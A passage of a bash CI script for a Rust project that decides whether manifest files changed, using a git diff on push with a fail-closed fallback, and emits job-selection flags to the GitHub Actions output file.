    Cargo.toml | Cargo.lock | crates/*/Cargo.toml | bench/Cargo.toml) return 0 ;;
    README.md | crates/*/README.md) return 0 ;;
    scripts/release-version.sh) return 0 ;;
    esac
    return 1
}

# Its own diff on push: push mode force-runs every job above as the last line
# of defence, while the dry run is selected on manifest reach alone, so
# `force_all` would pin it on for every merge. A diff that cannot be resolved
# (a force push, the zero SHA of a branch creation) fails closed to true, and
# the nightly backstop in scheduled.yml covers what a path list misses.
manifests=false
if [[ "$mode" == "push" ]]; then
    manifest_diff=$(mktemp)
    zero_sha=0000000000000000000000000000000000000000
    if [[ -n "${EVENT_BEFORE:-}" && "${EVENT_BEFORE:-}" != "$zero_sha" ]] &&
        git diff --no-ext-diff --no-textconv --name-only -z --no-renames \
            "$EVENT_BEFORE" HEAD >"$manifest_diff" 2>/dev/null; then
        while IFS= read -r -d '' file; do
            [[ -z "$file" ]] && continue
            if path_is_manifest "$file"; then
                manifests=true
            fi
        done <"$manifest_diff"
    else
        echo "note: no usable ${EVENT_BEFORE:-?}..HEAD diff; the manifest gate fails closed."
        manifests=true
    fi
    rm -f "$manifest_diff"
elif [[ "$force_all" == "1" ]]; then
    manifests=true
else
    while IFS= read -r -d '' file; do
        [[ -z "$file" ]] && continue
        if path_is_manifest "$file"; then
            manifests=true
        fi
    done <"$changed_file"
fi

# ---------------------------------------------------------------------------
# Emit.
# ---------------------------------------------------------------------------
{
    echo "rust=$rust"
    echo "site=$site"
    echo "containers=$([[ -n "$container_args" ]] && echo true || echo false)"
    echo "container-args=$container_args"
    echo "loom=$loom"
    echo "bench=$bench"
    echo "manifests=$manifests"
    # One line of JSON, and one line only: `$GITHUB_OUTPUT` is a key=value
    # file, so a multi-line value would need heredoc delimiters and a value
    # containing the delimiter is a known output-injection vector.
    echo "bench-shards=$bench_shards"
} | tee -a "${GITHUB_OUTPUT:-/dev/stdout}"
